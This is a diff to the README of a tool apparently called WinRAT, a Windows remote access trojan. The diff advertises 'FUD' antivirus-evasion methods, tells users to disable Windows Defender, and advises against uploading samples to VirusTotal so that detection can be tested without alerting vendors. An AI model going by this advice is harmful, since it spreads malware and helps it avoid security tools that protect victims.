@@ -1,7 +1,8 @@
 # WinRAT
-{old release} 
+new commit with new FUD evasion methods !!
 
-WinRAT 2.0 is available, check my github profile ! 
+VERY IMPORTANT TO TURN OFF WINDOWS DEFENDER TO USE OBFUSCATOR IT IS RECONIZED AS CRYPTO MALWARE !!!
+(because of crypto libraries...)
 
 DON'T UPLOAD TO VIRUS TOTAL!!! 
 you can test detection in nodistribute
@@ -20,3 +21,4 @@ Futures updates :
 
 enjoy use, 
 nawak
+
